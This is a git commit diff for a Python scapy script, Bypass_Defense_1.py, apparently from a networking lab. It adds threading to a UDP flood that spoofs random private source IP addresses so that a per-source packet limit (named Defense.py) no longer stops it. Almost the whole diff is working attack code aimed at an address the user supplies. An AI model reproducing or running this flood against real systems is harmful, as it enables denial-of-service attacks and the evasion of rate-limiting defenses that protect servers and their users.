7a57dd6e7f5f76f967671eb192a3fe5654f6f557
Hussein Mallah <mallahhuos3009@gmail.com>
2023-09-30 15:20:55 +0300

    Update Bypass_Defense_1.py
    Add threading functionality.

--- Huss/Bypass_Defense_1.py
+++ Huss/Bypass_Defense_1.py
@@ -1,9 +1,9 @@
 from scapy.all import *
 from scapy.layers.inet import UDP, IP
-message = input("Enter the message to send: ")
-iterations = int(input("Enter the number of times to execute the attack: "))
-i = 0
-#Will create enough IP addresses using private IP prefixes to bypass Defense.py
+import random
+import threading
+import time
+
 source_ips=[]
 for w in range(255):
     for k in range(255):
@@ -16,27 +16,46 @@ for w in range(255):
             source_ips.append(ip_address)
             source_ips.append(ip_address1)
 
-while (i <= iterations):
-    # Server IP and port
-    server_ip = '192.168.180.128'  # Replace with the actual server IP
-    server_port = 12345  # Replace with the actual server port
-
+# Function representing the task to be performed in each thread
+def send_udp_packet(server_ip, server_port, source_ips, message):
     # Choose a random source IP address
     source_ip = random.choice(source_ips)
 
-    #Make sure source_ip and server_ip don't coincide in order to bypass the maximum number of packets allowed
-    if (source_ip == server_ip):
-        continue
-
-    if message.lower() == 'exit':
-        break
-
-    # Create a UDP packet with a randomized source IP
-    udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / message
+    # Create a UDP packet with a randomized source IP, and without coinciding with server_ip
+    if (source_ip != server_ip): 
+        udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / message
 
     # Send the packet
     send(udp_packet)
-    i+=1
 
-# Close the socket
-print("Executed the attack for ", iterations, "time(s)")
+# Main function
+def main():
+    message = input("Enter the message to send: ")
+    iterations = int(input("Enter the number of times to execute the attack: "))
+    
+    # Server IP and port (replace with actual values)
+    server_ip = '192.168.180.128'
+    server_port = 12345
+
+
+    threads = []
+
+    start_time = time.time()  # Record the start time
+
+    # Create threads and start the attack
+    for _ in range(iterations):
+        thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, message))
+        threads.append(thread)
+        thread.start()
+
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join()
+
+    end_time = time.time()  # Record the end time
+
+    duration = end_time - start_time
+    print(f"Executed the attack for {iterations} time(s) in {duration:.2f} seconds.")
+
+if __name__ == "__main__":
+    main()
